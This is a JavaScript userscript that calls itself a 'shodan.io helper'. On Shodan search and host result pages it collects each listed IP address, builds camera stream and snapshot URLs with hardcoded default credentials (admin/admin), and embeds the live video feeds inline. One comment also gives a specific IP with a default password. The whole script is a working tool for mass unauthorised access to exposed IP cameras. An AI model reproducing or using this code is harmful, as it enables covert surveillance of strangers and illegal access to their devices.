// ==UserScript==
// @name         [skypesky 出品] shodan.io helper
// @author       skypesky
// @namespace    http://skypesky.cn/user/shodan
// @version      19.02.24
// @description  shodan.io helper
// @include      *://www.shodan.io/search?query*
// @include      *://www.shodan.io/host/*
// @require      https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js
// @connect      *
// @grant        GM_xmlhttpRequest
// @grant        GM_addStyle
// ==/UserScript==
(function () {
    "use strict";

    const websiteConfigArray = [{
            name: `query page`,
            url: `*://www.shodan.io/search?query*`,
            description: `查询界面`,
            rule: /\/\/www.shodan.io\/search\?query/,
            user: {
                username: "admin",
                password: "admin",
            },
            ip: {
                selector: `.search-result .ip a[style]`,
                attr: `href`
            },
            showView: {
                selector: `.search-result .ip`
            }
        },
        {
            name: `detail page`,
            description: `详情界面`,
            url: `https://www.shodan.io/host/212.66.116.26`,
            rule: /\/\/www.shodan.io\/host\//,
            user: {
                username: "admin",
                password: "admin",
            },
            ip: {
                selector: `div.service-details > a`,
                attr: `href`
            },
            showView: {
                selector: `div.service-details`
            }
        }
    ]

    $(function () {
        Controller.run(websiteConfigArray, (websiteConfig) => {
            ServerController.run(websiteConfig);
        });
    });

})();

// 服务
const ServerController = {
    websiteConfig: [],
    init: function (websiteConfig) {
        this.websiteConfig = websiteConfig;
    },
    run: function (websiteConfig) {
        // 初始化配置
        this.init(websiteConfig);
        if (ValidTool.arrayIsEmpty(this.websiteConfig)) {
            return;
        }
        // 获取所有的ip节点
        let ipArray = $(this.websiteConfig.ip.selector);
        if (ValidTool.arrayIsEmpty(ipArray)) {
            console.info("ipArray is empty");
            return;
        }
        // 创建一个用户
        let user = new User(this.websiteConfig.user.username, this.websiteConfig.user.password);

        for (let index = 0; index < ipArray.length; ++index) {
            // 第一步: 获取ip
            let ip = $(ipArray[index]).attr(this.websiteConfig.ip.attr);
            ip = ip.replace("http://", "");

            // 第二步: 登录(目前为止,没什么用处)
            user.login(ip);

            // 第三步: 获取视频
            // let livestreamImage = ViewTemplate.defaultImageView(user.getLoginUrl(ip));
            let videostreamImage = ViewTemplate.defaultImageView(user.getUrlForVideoStreamModel(ip));
            // let smartphoneImage = ViewTemplate.defaultImageView(user.getUrlForSmartPhoneModel(ip));
            // let sdCardImage = ViewTemplate.defaultImageView(user.getUrlForSDCardVideo(ip));

            // 第四步: 显示界面
            ViewTemplate.after($(this.websiteConfig.showView.selector)[index], [videostreamImage]);
        }
    }
}


const Controller = {
    indexOf: function (websiteConfigArray) {
        if (ValidTool.arrayIsEmpty(websiteConfigArray)) {
            return -1;
        }
        // 获取当前的路径
        let url = window.location.href;
        // 匹配路径
        for (let i = 0; i < websiteConfigArray.length; ++i) {
            if (websiteConfigArray[i].rule.test(url)) {
                return i;
            }
        }
        return -1;
    },
    run: function (websiteConfigArray, callback) {
        let index = this.indexOf(websiteConfigArray);
        if (index != -1) {
            console.log("路径匹配成功!" + websiteConfigArray[index].description);
            callback(websiteConfigArray[index]);
        } else {
            console.error("路径匹配失败!" + websiteConfigArray[index].description);
        }
    }
}


const ValidTool = {
    arrayNotEmpty: function (arrayObject) {
        if (typeof arrayObject == "undefined" || !arrayObject || arrayObject.length == 0) {
            return false;
        }
        return true;
    },
    arrayIsEmpty: function (arrayObject) {
        return !this.arrayNotEmpty(arrayObject);
    },
    selectorIsNull: function (selector) {
        return $(selector).length == 0;
    }
}




// User类
function User(username, password) {
    this.username = username;
    this.password = password;
    this.logined = false;
}

// 登录一下账号
User.prototype.login = function (ip) {
    // 已经登录过了
    this.logined = true;
}

User.prototype.init = function (username, password) {
    this.username = username;
    this.password = password;
}

// livestream mode (for Internet Explorer)       
User.prototype.getUrlForLiveStreamModel = function (ip) {
    return `${ip}`;
}

// videostream mode(for FireFox)
User.prototype.getUrlForVideoStreamModel = function (ip) {
    return `http://${ip}/videostream.cgi?loginuse=${this.username}&loginpas=${this.password}`;
}

// snapshot mode (for smartphone) 需要一个随机数,不停的请求即可
User.prototype.getUrlForSmartPhoneModel = function (ip) {
    return `http://${ip}/snapshot.cgi?user=${this.username}&pwd=${this.password}&15509023166720.9110314241702742`;
}
// http://http://221.86.17.124/snapshot.cgi?user=admin&pwd=123456&15509023166720.9110314241702742
// SD card video playback online
User.prototype.getUrlForSDCardVideo = function (ip) {
    return `${ip}`;
}

User.prototype.getLoginUrl = function (ip) {
    return ip;
}

// 视图模板
const ViewTemplate = {
    defaultImageView: function (url) {
        let imageView = `<div> <img onerror="$(this).hide();" src=${url} style="max-height: 100%; max-width: 600px; margin: 20px 20px 20px 10px;" /> </div>`;
        return imageView;
    },
    defaultHtmlView: function (html) {
        let htmlView = html;
        return htmlView;
    },
    after: function (selector, viewArray) {
        if (ValidTool.selectorIsNull(selector) || ValidTool.arrayIsEmpty(viewArray)) {
            console.log("viewArray is empty");
            return;
        }
        for (let index = viewArray.length - 1; index >= 0; --index) {
            $(selector).after(viewArray[index]);
        }
    }
}